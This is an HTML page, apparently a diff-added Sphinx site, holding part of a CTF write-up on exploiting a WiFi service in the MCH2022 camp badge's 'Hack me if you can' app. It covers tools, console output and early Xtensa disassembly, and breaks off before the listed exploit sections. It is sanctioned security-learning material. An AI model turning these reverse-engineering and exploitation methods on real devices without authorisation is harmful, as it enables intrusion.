@@ -1,0 +1,1422 @@
+
+<!DOCTYPE html>
+
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />
+
+    <title>Hack you ‘cause I can: Solving the MCH2022 badge CTF challenge &#8212; MCH2022 CTF Writeup  documentation</title>
+    
+  <!-- Loaded before other Sphinx assets -->
+  <link href="_static/styles/theme.css?digest=1999514e3f237ded88cf" rel="stylesheet">
+<link href="_static/styles/pydata-sphinx-theme.css?digest=1999514e3f237ded88cf" rel="stylesheet">
+
+    
+  <link rel="stylesheet"
+    href="_static/vendor/fontawesome/5.13.0/css/all.min.css">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="_static/vendor/fontawesome/5.13.0/webfonts/fa-solid-900.woff2">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="_static/vendor/fontawesome/5.13.0/webfonts/fa-brands-400.woff2">
+
+    <link rel="stylesheet" type="text/css" href="_static/pygments.css" />
+    <link rel="stylesheet" href="_static/styles/sphinx-book-theme.css?digest=5115cc725059bd94278eecd172e13a965bf8f5a9" type="text/css" />
+    
+  <!-- Pre-loaded scripts that we'll load fully later -->
+  <link rel="preload" as="script" href="_static/scripts/pydata-sphinx-theme.js?digest=1999514e3f237ded88cf">
+
+    <script data-url_root="./" id="documentation_options" src="_static/documentation_options.js"></script>
+    <script src="_static/jquery.js"></script>
+    <script src="_static/underscore.js"></script>
+    <script src="_static/doctools.js"></script>
+    <script src="_static/scripts/sphinx-book-theme.js?digest=9c920249402e914e316237a7dbc6769907cce411"></script>
+    <link rel="index" title="Index" href="genindex.html" />
+    <link rel="search" title="Search" href="search.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="docsearch:language" content="None">
+    
+
+    <!-- Google Analytics -->
+    
+  </head>
+  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="60">
+<!-- Checkboxes to toggle the left sidebar -->
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation" aria-label="Toggle navigation sidebar">
+<label class="overlay overlay-navbar" for="__navigation">
+    <div class="visually-hidden">Toggle navigation sidebar</div>
+</label>
+<!-- Checkboxes to toggle the in-page toc -->
+<input type="checkbox" class="sidebar-toggle" name="__page-toc" id="__page-toc" aria-label="Toggle in-page Table of Contents">
+<label class="overlay overlay-pagetoc" for="__page-toc">
+    <div class="visually-hidden">Toggle in-page Table of Contents</div>
+</label>
+<!-- Headers at the top -->
+<div class="announcement header-item noprint"></div>
+<div class="header header-item noprint"></div>
+
+    
+    <div class="container-fluid" id="banner"></div>
+
+    
+
+    <div class="container-xl">
+      <div class="row">
+          
+<!-- Sidebar -->
+<div class="bd-sidebar noprint single-page" id="site-navigation">
+</div>
+
+
+          
+
+
+          
+<!-- A tiny helper pixel to detect if we've scrolled -->
+<div class="sbt-scroll-pixel-helper"></div>
+<!-- Main content -->
+<div class="col py-0 content-container">
+    
+    <div class="header-article row sticky-top noprint">
+        
+
+
+
+<div class="col py-1 d-flex header-article-main">
+    <div class="header-article__left">
+        
+    </div>
+    <div class="header-article__right">
+<button onclick="toggleFullScreen()"
+  class="headerbtn"
+  data-toggle="tooltip"
+data-placement="bottom"
+title="Fullscreen mode"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-expand"></i>
+  </span>
+
+</button>
+
+<div class="menu-dropdown menu-dropdown-download-buttons">
+  <button class="headerbtn menu-dropdown__trigger"
+      aria-label="Download this page">
+      <i class="fas fa-download"></i>
+  </button>
+  <div class="menu-dropdown__content">
+    <ul>
+      <li>
+        <a href="_sources/index.rst.txt"
+   class="headerbtn"
+   data-toggle="tooltip"
+data-placement="left"
+title="Download source file"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-file"></i>
+  </span>
+<span class="headerbtn__text-container">.rst</span>
+</a>
+
+      </li>
+      
+      <li>
+        
+<button onclick="printPdf(this)"
+  class="headerbtn"
+  data-toggle="tooltip"
+data-placement="left"
+title="Print to PDF"
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-file-pdf"></i>
+  </span>
+<span class="headerbtn__text-container">.pdf</span>
+</button>
+
+      </li>
+      
+    </ul>
+  </div>
+</div>
+<label for="__page-toc"
+  class="headerbtn headerbtn-page-toc"
+  
+>
+  
+
+<span class="headerbtn__icon-container">
+  <i class="fas fa-list"></i>
+  </span>
+
+</label>
+
+    </div>
+</div>
+
+<!-- Table of contents -->
+<div class="col-md-3 bd-toc show noprint">
+    <div class="tocsection onthispage pt-5 pb-3">
+        <i class="fas fa-list"></i> Contents
+    </div>
+    <nav id="bd-toc-nav" aria-label="Page">
+        <ul class="visible nav section-nav flex-column">
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#introduction">
+   Introduction
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#materials">
+   Materials
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#feeling-our-way-around">
+   Feeling our way around
+  </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#behavior">
+     Behavior
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#console">
+     Console
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#disassembly">
+     Disassembly
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#xtensa-assembly-demystified">
+       Xtensa assembly demystified
+      </a>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#first-impressions">
+       First impressions
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#talking-to-the-echo-server">
+     Talking to the echo server
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#the-game-plan">
+   The Game Plan
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#where-s-the-flag">
+   Where’s the flag?
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#reversing-the-echo-server">
+   Reversing the echo server
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#details-of-the-xtensa-architecture-you-never-wanted-to-learn-but-now-have-to">
+   Details of the Xtensa architecture you never wanted to learn but now have to
+  </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#windowed-registers">
+     Windowed registers
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#the-call-entry-worksplit">
+     The
+     <code class="docutils literal notranslate">
+      <span class="pre">
+       call
+      </span>
+     </code>
+     -
+     <code class="docutils literal notranslate">
+      <span class="pre">
+       entry
+      </span>
+     </code>
+     worksplit
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#stack-layout">
+     Stack layout
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#coffee-break">
+   Coffee Break
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#reversing-the-echo-server-part-two-electric-boogaloo">
+   Reversing the echo server, part two: Electric Boogaloo
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#dude-where-s-my-stack">
+   Dude, where’s my stack?!
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#crafting-an-exploit-act-1-please-don-t-crash">
+   Crafting an exploit, act 1: Please don’t crash
+  </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#setting-up-a-template">
+     Setting up a template
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#choosing-register-values">
+     Choosing register values
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#putting-it-all-together">
+     Putting it all together
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#crafting-an-exploit-act-2-let-s-make-it-dance-maybe">
+   Crafting an exploit, act 2: Let’s make it dance! Maybe.
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#crafting-an-exploit-act-3-using-what-s-already-there">
+   Crafting an exploit, act 3: Using what’s already there
+  </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#finding-the-inspector-4">
+     Finding the Inspector
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#could-this-be-it">
+     Could this be it?
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#recap">
+   Recap
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#closing-words">
+   Closing words
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#footnotes">
+   Footnotes
+  </a>
+ </li>
+</ul>
+
+    </nav>
+</div>
+    </div>
+    <div class="article row">
+        <div class="col pl-md-3 pl-lg-5 content-container">
+            <!-- Table of contents that is only displayed when printing the page -->
+            <div id="jb-print-docs-body" class="onlyprint">
+                <h1>Hack you ‘cause I can: Solving the MCH2022 badge CTF challenge</h1>
+                <!-- Table of contents -->
+                <div id="print-main-content">
+                    <div id="jb-print-toc">
+                        
+                        <div>
+                            <h2> Contents </h2>
+                        </div>
+                        <nav aria-label="Page">
+                            <ul class="visible nav section-nav flex-column">
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#introduction">
+   Introduction
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#materials">
+   Materials
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#feeling-our-way-around">
+   Feeling our way around
+  </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#behavior">
+     Behavior
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#console">
+     Console
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#disassembly">
+     Disassembly
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#xtensa-assembly-demystified">
+       Xtensa assembly demystified
+      </a>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#first-impressions">
+       First impressions
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#talking-to-the-echo-server">
+     Talking to the echo server
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#the-game-plan">
+   The Game Plan
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#where-s-the-flag">
+   Where’s the flag?
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#reversing-the-echo-server">
+   Reversing the echo server
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#details-of-the-xtensa-architecture-you-never-wanted-to-learn-but-now-have-to">
+   Details of the Xtensa architecture you never wanted to learn but now have to
+  </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#windowed-registers">
+     Windowed registers
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#the-call-entry-worksplit">
+     The
+     <code class="docutils literal notranslate">
+      <span class="pre">
+       call
+      </span>
+     </code>
+     -
+     <code class="docutils literal notranslate">
+      <span class="pre">
+       entry
+      </span>
+     </code>
+     worksplit
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#stack-layout">
+     Stack layout
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#coffee-break">
+   Coffee Break
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#reversing-the-echo-server-part-two-electric-boogaloo">
+   Reversing the echo server, part two: Electric Boogaloo
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#dude-where-s-my-stack">
+   Dude, where’s my stack?!
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#crafting-an-exploit-act-1-please-don-t-crash">
+   Crafting an exploit, act 1: Please don’t crash
+  </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#setting-up-a-template">
+     Setting up a template
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#choosing-register-values">
+     Choosing register values
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#putting-it-all-together">
+     Putting it all together
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#crafting-an-exploit-act-2-let-s-make-it-dance-maybe">
+   Crafting an exploit, act 2: Let’s make it dance! Maybe.
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#crafting-an-exploit-act-3-using-what-s-already-there">
+   Crafting an exploit, act 3: Using what’s already there
+  </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#finding-the-inspector-4">
+     Finding the Inspector
+    </a>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#could-this-be-it">
+     Could this be it?
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#recap">
+   Recap
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#closing-words">
+   Closing words
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#footnotes">
+   Footnotes
+  </a>
+ </li>
+</ul>
+
+                        </nav>
+                    </div>
+                </div>
+            </div>
+            <main id="main-content" role="main">
+                
+              <div>
+                
+  <section id="hack-you-cause-i-can-solving-the-mch2022-badge-ctf-challenge">
+<h1><a class="toc-backref" href="#id13">Hack you ‘cause I can: Solving the MCH2022 badge CTF challenge</a><a class="headerlink" href="#hack-you-cause-i-can-solving-the-mch2022-badge-ctf-challenge" title="Permalink to this headline">#</a></h1>
+<p>a writeup by Joachim “dojoe” Fenkes (<a class="reference external" href="https://github.com/dojoe">github</a>) (<a class="reference external" href="https://twitter.com/dop3j0e">twitter</a>)</p>
+<div class="contents topic" id="table-of-contents">
+<p class="topic-title">Table of contents</p>
+<ul class="simple">
+<li><p><a class="reference internal" href="#hack-you-cause-i-can-solving-the-mch2022-badge-ctf-challenge" id="id13">Hack you ‘cause I can: Solving the MCH2022 badge CTF challenge</a></p>
+<ul>
+<li><p><a class="reference internal" href="#introduction" id="id14">Introduction</a></p></li>
+<li><p><a class="reference internal" href="#materials" id="id15">Materials</a></p></li>
+<li><p><a class="reference internal" href="#feeling-our-way-around" id="id16">Feeling our way around</a></p></li>
+<li><p><a class="reference internal" href="#the-game-plan" id="id17">The Game Plan</a></p></li>
+<li><p><a class="reference internal" href="#where-s-the-flag" id="id18">Where’s the flag?</a></p></li>
+<li><p><a class="reference internal" href="#reversing-the-echo-server" id="id19">Reversing the echo server</a></p></li>
+<li><p><a class="reference internal" href="#details-of-the-xtensa-architecture-you-never-wanted-to-learn-but-now-have-to" id="id20">Details of the Xtensa architecture you never wanted to learn but now have to</a></p></li>
+<li><p><a class="reference internal" href="#coffee-break" id="id21">Coffee Break</a></p></li>
+<li><p><a class="reference internal" href="#reversing-the-echo-server-part-two-electric-boogaloo" id="id22">Reversing the echo server, part two: Electric Boogaloo</a></p></li>
+<li><p><a class="reference internal" href="#dude-where-s-my-stack" id="id23">Dude, where’s my stack?!</a></p></li>
+<li><p><a class="reference internal" href="#crafting-an-exploit-act-1-please-don-t-crash" id="id24">Crafting an exploit, act 1: Please don’t crash</a></p></li>
+<li><p><a class="reference internal" href="#crafting-an-exploit-act-2-let-s-make-it-dance-maybe" id="id25">Crafting an exploit, act 2: Let’s make it dance! Maybe.</a></p></li>
+<li><p><a class="reference internal" href="#crafting-an-exploit-act-3-using-what-s-already-there" id="id26">Crafting an exploit, act 3: Using what’s already there</a></p></li>
+<li><p><a class="reference internal" href="#recap" id="id27">Recap</a></p></li>
+<li><p><a class="reference internal" href="#closing-words" id="id28">Closing words</a></p></li>
+<li><p><a class="reference internal" href="#footnotes" id="id29">Footnotes</a></p></li>
+</ul>
+</li>
+</ul>
+</div>
+<section id="introduction">
+<h2><a class="toc-backref" href="#id14">Introduction</a><a class="headerlink" href="#introduction" title="Permalink to this headline">#</a></h2>
+<p>At the <a class="reference external" href="https://mch2022.org/">MCH2022</a> hacker camp, there was a great <a class="reference external" href="https://ctf.mch2022.org/home">CTF</a> with interesting challenges, and one of the challenges involved the <a class="reference external" href="https://wiki.mch2022.org/Badge">camp badge</a>, which is built around an <a class="reference external" href="https://en.wikipedia.org/wiki/ESP32">ESP32</a> chip as its main processor. The badge operating system allows folks to build apps for the ESP32 which can be launched from the main menu, and the badge came pre-loaded with a bunch of such apps.</p>
+<p>One of these apps is called <a class="reference external" href="https://ctf.mch2022.org/challenge?id=40">“Hack me if you can”</a>, and the CTF challenge was to find a bug in that app which could be exploited over WiFi to extract the flag from the badge. To make sure that people wouldn’t simply extract the flag some other way, most badges contained a dummy flag, and only a few select badges (closely guarded by the folks in the CTF tent) would contain the real flag. This way, folks could develop a remote exploit using their own badge and, once they had a working exploit, visit the CTF tent to retrieve the flag.</p>
+<p><a class="reference external" href="https://ctf.mch2022.org/user?id=20">Our team</a> was one of only two teams to solve the challenge during the camp and retrieve the flag, which both makes me very proud and morally compels me to write up our findings. So here’s the story of how we got from knowing absolutely fuck-all to a delicious flag.</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>This is a post-mortem writeup where I am documenting the happy path, omitting most of the many false starts and dead ends we encountered. If anything in here makes you think “Jeez, how did they come up with <em>that</em>?”, you’re probably reading the straight-line version of what used to be a winding road :)</p>
+</div>
+</section>
+<section id="materials">
+<h2><a class="toc-backref" href="#id15">Materials</a><a class="headerlink" href="#materials" title="Permalink to this headline">#</a></h2>
+<p>Before we begin, let’s gather some materials. Even if you don’t have an MCH badge at hand you’ll be able to follow parts of this writeup with them.</p>
+<ul class="simple">
+<li><p><a class="reference external" href="https://ghidra-sre.org/">Ghidra</a> for reverse engineering - I used version 10.1.4 for this challenge in case it matters</p></li>
+<li><p><a class="reference external" href="https://github.com/espressif/esptool">esptool</a> for converting ELF files into ESP .bin files</p></li>
+<li><p><a class="reference external" href="https://github.com/badgeteam/mch2022-tools/archive/refs/heads/master.zip">mch2022-tools</a> for uploading apps to the badge</p></li>
+<li><p><a class="reference external" href="hackmeifyoucan.tgz">hackmeifyoucan.tgz</a> - the ELF variant of the app, including debug symbols</p></li>
+<li><p>The <a class="reference external" href="xtensa.pdf">Xtensa ISA reference</a> for understanding the core</p>
+<ul>
+<li><p><a class="reference external" href="https://0x04.net/~mwk/doc/xtensa.pdf">Mirrored from here</a> for preservation</p></li>
+</ul>
+</li>
+<li><p>The <a class="reference external" href="https://github.com/yath/ghidra-xtensa">Ghidra Xtensa</a> plugin for disassembling the binary</p>
+<ul>
+<li><p>The 0.3 release on GitHub is ancient and won’t work with recent Ghidra versions. You’ll have to build the latest HEAD from source or use <a class="reference external" href="ghidra-xtensa-e307f72.zip">this pre-built release</a> if you choose to trust my partner in crime DoubleJ who did the build.</p></li>
+</ul>
+</li>
+</ul>
+</section>
+<section id="feeling-our-way-around">
+<h2><a class="toc-backref" href="#id16">Feeling our way around</a><a class="headerlink" href="#feeling-our-way-around" title="Permalink to this headline">#</a></h2>
+<p>Okay, now that we have all our materials at hand, let’s take a look at the app!</p>
+<section id="behavior">
+<h3>Behavior<a class="headerlink" href="#behavior" title="Permalink to this headline">#</a></h3>
+<p>After starting, the app will show a “Starting service…” screen for a while, followed by the application main screen:</p>
+<img alt="_images/appscreen.jpg" src="_images/appscreen.jpg" />
+<p>In addition, the kite LEDs on the badge will turn red, green or yellow depending on the detected configuration:</p>
+<ul class="simple">
+<li><p>Yellow: The app needs to be updated</p></li>
+<li><p>Green: The app is up and running but this badge only contains a dummy flag.</p></li>
+<li><p>Red: The app is up and running and this badge contains the actual flag.</p></li>
+</ul>
+<p>Well, it says there’s a service. It would be rude not to take it up on that offer:</p>
+<img alt="_images/addressbar.png" src="_images/addressbar.png" />
+<p>The app displays a screen asking whether I want to accept the connection from my laptop - that’s promising. Let’s accept.</p>
+<p>…huh. Firefox displays a blank page, and according to the badge display, the app has crashed. It also says <code class="docutils literal notranslate"><span class="pre">check</span> <span class="pre">console</span> <span class="pre">for</span> <span class="pre">more</span> <span class="pre">details</span></code> …there’s a console?</p>
+<p>We just learned a few things:</p>
+<blockquote class="highlights">
+<div><ol class="arabic simple">
+<li><p>The app is probably not an HTTP server.</p></li>
+<li><p>Whatever it serves, it’s got a crashy bug that might be exploitable!</p></li>
+<li><p>The badge developers seem to have implemented a pretty kickass crash recovery system.</p></li>
+<li><p>There’s apparently a “console” of some sort.</p></li>
+</ol>
+</div></blockquote>
+<p>That latter part is intriguing - let’s find that console!</p>
+</section>
+<section id="console">
+<h3>Console<a class="headerlink" href="#console" title="Permalink to this headline">#</a></h3>
+<p>The presence of a serial console is a little hidden on the <a class="reference external" href="https://www.badge.team/docs/badges/mch2022/hardware/">Hardware</a> page of the <a class="reference external" href="https://www.badge.team/docs/badges/mch2022/">Badge documentation</a> but hey, just plugging the badge in and looking at your shiny new USB devices would have easily tipped you off anyway so ehh.</p>
+<p>There’s actually two USB serial consoles on the badge. One leads to the ESP, the other to the FPGA. Myself, I didn’t know that until five minutes ago, I just picked the one that spewed data when I booted the badge :) Speaking of spewing data; do set a baud rate of 115200 when you connect, anything else will yield UART encrypted text (aka gibberish).</p>
+<p>Launching the <code class="docutils literal notranslate"><span class="pre">Hack</span> <span class="pre">me</span> <span class="pre">if</span> <span class="pre">you</span> <span class="pre">can</span></code> app with the USB console connected yields a <em>metric fuckton</em> of information, along with this:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">I</span> <span class="p">(</span><span class="mi">4408</span><span class="p">)</span> <span class="n">hack</span><span class="o">-</span><span class="n">me</span><span class="o">-</span><span class="k">if</span><span class="o">-</span><span class="n">you</span><span class="o">-</span><span class="n">can</span><span class="p">:</span> <span class="n">Socket</span> <span class="n">bound</span> <span class="mf">192.168.178.50</span><span class="p">:</span><span class="mi">1337</span>
+<span class="n">I</span> <span class="p">(</span><span class="mi">4408</span><span class="p">)</span> <span class="n">hack</span><span class="o">-</span><span class="n">me</span><span class="o">-</span><span class="k">if</span><span class="o">-</span><span class="n">you</span><span class="o">-</span><span class="n">can</span><span class="p">:</span> <span class="n">No</span> <span class="n">flag</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">hackmeifyoucan</span><span class="p">:</span><span class="n">flag</span> <span class="n">NVS</span> <span class="n">storage</span><span class="o">...</span>
+<span class="n">I</span> <span class="p">(</span><span class="mi">4438</span><span class="p">)</span> <span class="n">hack</span><span class="o">-</span><span class="n">me</span><span class="o">-</span><span class="k">if</span><span class="o">-</span><span class="n">you</span><span class="o">-</span><span class="n">can</span><span class="p">:</span> <span class="n">Flag</span> <span class="nb">set</span> <span class="n">to</span><span class="p">:</span> <span class="n">flag</span><span class="p">{</span><span class="n">not_a_real_flag</span><span class="p">}</span>
+</pre></div>
+</div>
+<p>Neat! So we learned some more things!</p>
+<blockquote class="highlights">
+<div><ol class="arabic simple" start="4">
+<li><p>(updated) There’s a serial USB console which is a veritable <em>trove</em> of information!</p></li>
+<li><p>The difference between a badge that contains a flag and one that doesn’t seems to be a record in some non-volatile storage, and if that record is not present the app will use a dummy flag value.</p></li>
+<li><p>As a direct result from 5, we can conjecture that badges with a flag are running the <em>exact same binary</em> as we are, which would be great as we would be able to transfer our exploit without having to guess at differences between app variants.</p></li>
+</ol>
+</div></blockquote>
+<p>We did not, however, figure out which protocol the app is serving yet. Let’s crack open the binary, maybe it will speak to us.</p>
+</section>
+<section id="disassembly">
+<h3>Disassembly<a class="headerlink" href="#disassembly" title="Permalink to this headline">#</a></h3>
+<p>So let’s load the .elf file conveniently provided by the app developers into Ghidra. The app uses the Xtensa LX6 core built into the ESP32 chip, and fresh out of the box Ghidra doesn’t know jack about that architecture, so we have to install the Xtensa plugin first. Installation is simple: Just extract the <code class="docutils literal notranslate"><span class="pre">Xtensa</span></code> directory from the zip into the <code class="docutils literal notranslate"><span class="pre">Ghidra/Processors</span></code> subdirectory of where you installed Ghidra, then restart Ghidra if you had it open.</p>
+<p>Now you can create a new project for this challenge, import <code class="docutils literal notranslate"><span class="pre">hack_me_if_you_can.elf</span></code> with default settings, load it into the Code Browser and run the default set of analysis steps.</p>
+<p>You will find that Ghidra already knows an awful lot about the target program - structs, symbols, locations, sections etcetera. This is thanks to the debug symbols conveniently left in the .elf file by the developers. Apparently they don’t want us to spend hours wading through incomprehensible disassembly and following red herrings and instead to focus on the actual bug and exploitation thereof. Thank you for that &lt;3</p>
+<p>You will also quickly find that the decompiler produces only gibberish. The Xtensa plugin provides disassembler support but no working decompiler support <a class="footnote-reference brackets" href="#id9" id="id4">1</a>, so we’ll have to work with the disassembly LIKE WE DID IN THE OLD DAYS <em>&lt;strokes grey beard&gt;</em>. Best expand that disassembly pane and switch the right pane to something other than the decompiler, it’ll only confuse the heck out of us.</p>
+<section id="xtensa-assembly-demystified">
+<h4>Xtensa assembly demystified<a class="headerlink" href="#xtensa-assembly-demystified" title="Permalink to this headline">#</a></h4>
+<p>Xtensa assembly is pretty easy to read if you’re already acquainted with other RISC architectures like ARM or PowerPC. The instruction mnemonics are intuitive and there are no special registers whatsoever, just a GPR file of registers <code class="docutils literal notranslate"><span class="pre">a0</span></code>..``a15``. Looking at the assembly, it seems like a1 is used as the stack pointer - the <code class="docutils literal notranslate"><span class="pre">entry</span> <span class="pre">a1,</span> <span class="pre">&lt;value&gt;</span></code> at the beginning of functions is a dead giveaway. Let’s keep that in mind for later.</p>
+<p>The one thing that caused me some confusion at first was that there are different flavors of some instructions, such as <code class="docutils literal notranslate"><span class="pre">mov</span></code> and <code class="docutils literal notranslate"><span class="pre">mov.n</span></code> - do those .n instructions have special meaning? A bit of browsing the ISA reference quickly reveals that no, they do exactly the same. Xtensa just has a special “narrow” encoding for some instructions that come up a lot in average code. Normal Xtensa instructions are three bytes, whereas the narrow forms only take up two bytes, conserving some code space. So <code class="docutils literal notranslate"><span class="pre">mov.n</span></code> is simply the narrow variant of <code class="docutils literal notranslate"><span class="pre">mov</span></code> and when reading the assembly we can treat it exactly the same as <code class="docutils literal notranslate"><span class="pre">mov</span></code>.</p>
+</section>
+<section id="first-impressions">
+<h4>First impressions<a class="headerlink" href="#first-impressions" title="Permalink to this headline">#</a></h4>
+<p>With that out of the way, let’s take a look at the disassembly.</p>
+<img alt="_images/appheader.png" src="_images/appheader.png" />
+<p>Nice app header that nobody cares about. Where’s the main function? Since we have debug symbols, we can just search the symbol tree for <code class="docutils literal notranslate"><span class="pre">main</span></code> and quickly find two symbols of interest, <code class="docutils literal notranslate"><span class="pre">main_task</span></code> and <code class="docutils literal notranslate"><span class="pre">app_main</span></code>. No pure <code class="docutils literal notranslate"><span class="pre">main</span></code>.</p>
+<p>Looking at <code class="docutils literal notranslate"><span class="pre">main_task</span></code>, we quickly find that it seems to end up deferring to <code class="docutils literal notranslate"><span class="pre">app_main</span></code>:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>                      <span class="n">LAB_4016f6ac</span>       <span class="n">XREF</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span>     <span class="mi">4016</span><span class="n">f690</span><span class="p">(</span><span class="n">j</span><span class="p">),</span> <span class="mi">4016</span><span class="n">f698</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
+<span class="mi">4016</span><span class="n">f6ac</span> <span class="mi">81</span> <span class="n">e8</span> <span class="mi">81</span>        <span class="n">l32r</span>       <span class="n">a8</span><span class="p">,</span><span class="o">-&gt;</span><span class="n">app_main</span>   <span class="o">=</span> <span class="mi">400</span><span class="n">d7918</span>
